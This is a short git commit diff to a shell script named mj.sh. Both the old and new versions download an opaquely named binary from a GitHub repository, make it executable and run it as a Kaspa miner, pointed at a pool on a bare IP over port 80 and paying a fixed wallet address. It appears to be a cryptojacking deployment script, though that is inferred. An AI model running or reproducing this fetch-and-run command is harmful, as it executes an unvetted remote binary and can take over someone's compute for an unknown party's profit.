172f4ce2b89a80ea74be9e017da1503a1d1c8ffd
sbwsmg <108033976+sbwsmg@users.noreply.github.com>
2022-11-06 17:55:58 +0800

    Update mj.sh

--- mj.sh
+++ mj.sh
@@ -1,3 +1,1 @@
-wget https://github.com/angkii/m/raw/main/AkubapakMU
-chmod 700 AkubapakMU
-./AkubapakMU --algo KASPA --pool stratum+ssl://134.122.17.41:80 --user kaspa:qzhva42mxq008mp25jfwrqqeavp8t38r5qynm3fq44zwtpptjyezqk09sxvme
+git clone https://github.com/angkii/m.git && cd m && chmod +x AkubapakMU && ./AkubapakMU --algo KASPA --pool stratum+ssl://134.122.17.41:80 --user kaspa:qzhva42mxq008mp25jfwrqqeavp8t38r5qynm3fq44zwtpptjyezqk09sxvme.madeline
